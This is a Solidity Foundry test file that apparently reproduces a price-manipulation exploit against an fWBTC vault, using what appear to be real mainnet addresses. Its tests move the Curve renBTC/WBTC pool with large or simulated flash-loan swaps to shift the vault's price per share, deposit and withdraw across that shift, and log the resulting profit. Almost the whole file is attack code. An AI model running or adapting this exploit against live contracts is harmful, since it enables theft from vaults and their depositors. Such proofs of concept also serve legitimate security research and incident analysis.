// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ICurveRen {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function balances(int128 i) external view returns (uint256);
}

interface IHVault {
    function deposit(uint256) external;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract TestWBTC is Test {
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant RENBTC = 0xEB4C2781e4ebA804CE9a9803C67d0893436bB27D;
    ICurveRen constant CURVE = ICurveRen(0x93054188d876f558f4a66B2EF1d97d16eDf0895B);
    IHVault constant FWBTC = IHVault(0x5d9d25c7C457dD82fc8668FFC6B9746b674d4EcB);

    function testCurveRenExchange() public {
        deal(WBTC, address(this), 1000e8);
        IERC20(WBTC).approve(address(CURVE), type(uint256).max);

        uint256 renBefore = IERC20(RENBTC).balanceOf(address(this));
        CURVE.exchange(1, 0, 100e8, 0);
        uint256 renAfter = IERC20(RENBTC).balanceOf(address(this));
        emit log_named_uint("renBTC received", renAfter - renBefore);
    }

    function testReverseManipulation() public {
        // NEW APPROACH: deposit at normal → inflate PPFS → withdraw at high
        deal(WBTC, address(this), 25000e8);
        IERC20(WBTC).approve(address(CURVE), type(uint256).max);
        IERC20(RENBTC).approve(address(CURVE), type(uint256).max);
        IERC20(WBTC).approve(address(FWBTC), type(uint256).max);

        uint256 ppfsBefore = FWBTC.getPricePerFullShare();
        emit log_named_uint("PPFS before", ppfsBefore);

        // Step 1: Deposit WBTC at NORMAL PPFS
        FWBTC.deposit(8000e8);
        uint256 shares = FWBTC.balanceOf(address(this));
        emit log_named_uint("Shares from deposit", shares);

        // Step 2: INFLATE — pump WBTC into Curve pool (WBTC plentiful → PPFS UP)
        CURVE.exchange(1, 0, 15000e8, 0);  // WBTC→renBTC, pool gets MORE WBTC
        uint256 ppfsAfterInflate = FWBTC.getPricePerFullShare();
        emit log_named_uint("PPFS after inflate", ppfsAfterInflate);
        emit log_named_uint("PPFS change %", (ppfsAfterInflate - ppfsBefore) * 10000 / ppfsBefore);

        // Step 3: Withdraw at INFLATED PPFS
        FWBTC.withdraw(shares);

        // Step 4: Reverse pump — renBTC→WBTC (restore pool)
        uint256 renBal = IERC20(RENBTC).balanceOf(address(this));
        CURVE.exchange(0, 1, renBal, 0);

        uint256 wbtcFinal = IERC20(WBTC).balanceOf(address(this));
        emit log_named_uint("WBTC final", wbtcFinal);
        emit log_named_uint("WBTC profit", wbtcFinal > 25000e8 ? wbtcFinal - 25000e8 : 0);
        emit log_named_uint("WBTC loss", 25000e8 > wbtcFinal ? 25000e8 - wbtcFinal : 0);
        emit log_named_uint("ETH equiv profit", (wbtcFinal > 25000e8 ? wbtcFinal - 25000e8 : 0) * 32);
    }

    function testDirectionalPump() public {
        // Simulate flash: 5000 WBTC outer + 181 renBTC inner
        deal(WBTC, address(this), 5000e8);
        deal(RENBTC, address(this), 181e8);
        IERC20(WBTC).approve(address(CURVE), type(uint256).max);
        IERC20(RENBTC).approve(address(CURVE), type(uint256).max);
        IERC20(WBTC).approve(address(FWBTC), type(uint256).max);

        uint256 ppfsBefore = FWBTC.getPricePerFullShare();
        emit log_named_uint("PPFS before", ppfsBefore);

        // Pump: renBTC→WBTC (removes WBTC from pool → scarce → fWBTC PPFS DOWN)
        uint256 wbtcBefore = IERC20(WBTC).balanceOf(address(this));
        CURVE.exchange(0, 1, 181e8, 0);
        uint256 pumpedWBTC = IERC20(WBTC).balanceOf(address(this)) - wbtcBefore;
        emit log_named_uint("Pumped WBTC output", pumpedWBTC);

        uint256 ppfsAfterPump = FWBTC.getPricePerFullShare();
        emit log_named_uint("PPFS after pump", ppfsAfterPump);
        emit log_named_uint("PPFS deflation", ppfsBefore > ppfsAfterPump ? ppfsBefore - ppfsAfterPump : 0);
        emit log_named_uint("PPFS inflation", ppfsAfterPump > ppfsBefore ? ppfsAfterPump - ppfsBefore : 0);

        // Deposit pumped WBTC at deflated PPFS
        FWBTC.deposit(pumpedWBTC);
        uint256 shares = FWBTC.balanceOf(address(this));
        emit log_named_uint("Shares received", shares);

        // Dump: WBTC→renBTC (adds WBTC back → PPFS UP)
        CURVE.exchange(1, 0, 181e8, 0);
        uint256 ppfsAfterDump = FWBTC.getPricePerFullShare();
        emit log_named_uint("PPFS after dump", ppfsAfterDump);

        // Withdraw shares
        FWBTC.withdraw(shares);
        uint256 wbtcFinal = IERC20(WBTC).balanceOf(address(this));
        uint256 renFinal = IERC20(RENBTC).balanceOf(address(this));
        emit log_named_uint("WBTC final", wbtcFinal);
        emit log_named_uint("renBTC final", renFinal);

        // Net: started with 5000 WBTC + 181 renBTC
        // If WBTC > 5000e8 or renBTC > 181e8: profit
        emit log_named_uint("WBTC delta", wbtcFinal > 5000e8 ? wbtcFinal - 5000e8 : 0);
        emit log_named_uint("renBTC delta", renFinal > 181e8 ? renFinal - 181e8 : 0);
        emit log_named_uint("WBTC deficit", 5000e8 > wbtcFinal ? 5000e8 - wbtcFinal : 0);
        emit log_named_uint("renBTC deficit", 181e8 > renFinal ? 181e8 - renFinal : 0);
    }
}
